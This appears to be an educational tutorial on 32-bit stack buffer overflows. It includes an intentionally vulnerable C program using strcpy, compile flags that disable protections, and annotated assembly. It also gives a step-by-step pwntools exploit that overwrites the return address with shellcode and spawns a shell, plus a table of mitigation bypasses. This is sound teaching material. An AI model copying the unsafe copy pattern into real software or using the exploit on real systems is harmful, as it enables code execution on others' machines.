# Stack Buffer Overflow

## Overview

A **stack buffer overflow** occurs when a program writes more data to a buffer located on the stack than it was allocated to hold. This overwrites adjacent memory, including critical data like the **saved frame pointer (SFP)** and **return address**, allowing an attacker to hijack program execution.

---

## Vulnerable C Code

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *user_input) {
    char buffer[64];  // 64-byte buffer on the stack
    
    // VULNERABILITY: No bounds checking!
    strcpy(buffer, user_input);  // Copies unlimited data
    
    printf("You entered: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    vulnerable_function(argv[1]);
    
    printf("Execution completed normally.\n");
    return 0;
}
```

### Compilation
```bash
# Compile without protections (for educational purposes)
gcc -o stack_overflow stack_overflow.c -fno-stack-protector -z execstack -no-pie -m32

# Flags explained:
# -fno-stack-protector : Disable stack canaries
# -z execstack         : Make stack executable (allows shellcode)
# -no-pie              : Disable ASLR for executable
# -m32                 : Compile as 32-bit (easier to understand)
```

---

## Assembly Emulation (Intel Syntax - x86)

```asm
; Function prologue
vulnerable_function:
    push   ebp                  ; Save old frame pointer
    mov    ebp, esp             ; Set new frame pointer
    sub    esp, 0x50            ; Allocate 80 bytes (64 for buffer + alignment)
    
    ; strcpy(buffer, user_input)
    mov    eax, DWORD PTR [ebp+8]   ; Load user_input pointer (1st argument)
    lea    edx, [ebp-0x44]          ; Load address of buffer (ebp-68)
    push   eax                      ; Push source (user_input)
    push   edx                      ; Push destination (buffer)
    call   strcpy@plt               ; Call strcpy
    add    esp, 0x8                 ; Clean up stack (2 arguments)
    
    ; printf("You entered: %s\n", buffer)
    lea    eax, [ebp-0x44]          ; Load buffer address
    push   eax                      ; Push buffer as argument
    push   OFFSET format_string     ; Push format string
    call   printf@plt
    add    esp, 0x8
    
    ; Function epilogue
    leave                       ; Equivalent to: mov esp, ebp; pop ebp
    ret                         ; Pop return address into EIP
```

### Critical Instructions

| Instruction | Purpose | Exploitation Impact |
|-------------|---------|---------------------|
| `push ebp` | Save caller's frame pointer | Overwritten during overflow |
| `mov ebp, esp` | Establish new stack frame | Reference point for local vars |
| `sub esp, 0x50` | Allocate stack space | Creates buffer area |
| `leave` | Restore stack frame | `mov esp, ebp; pop ebp` |
| `ret` | Return to caller | **Pops corrupted address into EIP** |

---

## Memory State Visualization

### Normal Execution (Before Overflow)

```
High Memory Addresses
┌─────────────────────────────┐
│   Command Line Arguments    │  (argv[1])
├─────────────────────────────┤
│         ...                 │
├─────────────────────────────┤
│   Return Address (main+X)   │  ← Points back to main()
├─────────────────────────────┤  ← EBP (Frame Pointer)
│   Saved Frame Pointer (SFP) │  ← Old EBP value
├─────────────────────────────┤
│                             │
│   buffer[64]                │  ← Local variable (64 bytes)
│   "Hello"                   │  ← User input (5 bytes + null)
│                             │
├─────────────────────────────┤  ← ESP (Stack Pointer)
│   Unused Stack Space        │
└─────────────────────────────┘
Low Memory Addresses

Stack grows downward (towards lower addresses)
```

### After Overflow Attack

**Attack Input:** `python3 -c 'print("A"*72 + "\xef\xbe\xad\xde")'`

```
High Memory Addresses
┌─────────────────────────────┐
│   Command Line Arguments    │
├─────────────────────────────┤
│         ...                 │
├─────────────────────────────┤
│   0xDEADBEEF                │  ← CORRUPTED! (Was return address)
├─────────────────────────────┤  ← EBP
│   0x41414141 ("AAAA")       │  ← CORRUPTED! (Was SFP)
├─────────────────────────────┤
│   0x41414141                │
│   0x41414141                │  ← buffer[64] completely filled
│   0x41414141                │     with 'A' (0x41)
│   ... (16 rows of AAAA)     │
│   0x41414141                │
├─────────────────────────────┤  ← ESP
│   Unused Stack Space        │
└─────────────────────────────┘
Low Memory Addresses

When 'ret' executes:
1. Pops 0xDEADBEEF into EIP
2. CPU jumps to 0xDEADBEEF
3. Segmentation fault (or shellcode execution if valid address)
```

---

## Exploitation Workflow

### Step 1: Determine Offset

```bash
# Generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(100))" > pattern.txt

# Run program with pattern
./stack_overflow $(cat pattern.txt)

# In GDB, check EIP at crash
gdb ./stack_overflow
(gdb) run $(python3 -c "from pwn import *; print(cyclic(100))")
# Program crashes...
(gdb) info registers eip
# eip: 0x62616164

# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x62616164))"
# Output: 72
```

### Step 2: Craft Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = ELF('./stack_overflow')
context.arch = 'i386'

# Shellcode: execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# Build payload
offset = 72
nop_sled = b"\x90" * 20  # NOP sled for reliability

# Calculate return address (address of buffer + NOP sled offset)
# In practice, find this with: (gdb) x/x $esp
buffer_addr = 0xffffcf10  # Example address (varies per system)
ret_addr = p32(buffer_addr + 20)

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))  # Padding
payload += ret_addr  # Overwrite return address

# Execute
p = process([binary.path, payload])
p.interactive()  # Should drop to shell
```

### Step 3: Verification

```bash
$ python3 exploit.py
[*] '/path/to/stack_overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './stack_overflow': pid 12345
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ whoami
user
```

---

## Mitigation Techniques

| Protection | Mechanism | Bypass Method |
|-----------|-----------|---------------|
| **Stack Canaries** | Random value before return address | Leak canary via format string |
| **NX/DEP** | Non-executable stack | Use ROP (Return-Oriented Programming) |
| **ASLR** | Randomize stack addresses | Leak addresses via info disclosure |
| **PIE** | Randomize code segment | Leak code pointers |
| **FORTIFY_SOURCE** | Compile-time buffer checks | Find unchecked functions |

---

## Key Takeaways

1. **Root Cause:** Unbounded copy operations (`strcpy`, `gets`, `sprintf`)
2. **Impact:** Complete control of instruction pointer (EIP/RIP)
3. **Detection:** Fuzzing with oversized inputs, static analysis for dangerous functions
4. **Exploitation:** Overwrite return address → Jump to shellcode or ROP chain
5. **Modern Defense:** Multiple layers (canaries + NX + ASLR + PIE)

---

## Further Reading

- [Smashing The Stack For Fun And Profit (Phrack 49)](http://phrack.org/issues/49/14.html)
- [Intel x86 Calling Conventions](../architecture/x86/)
- [ROP Techniques](../analysis_tools/GDB_Scripts/rop_chains.md)

---

**Practice Challenge:** Exploit this binary with ASLR enabled (requires address leak).
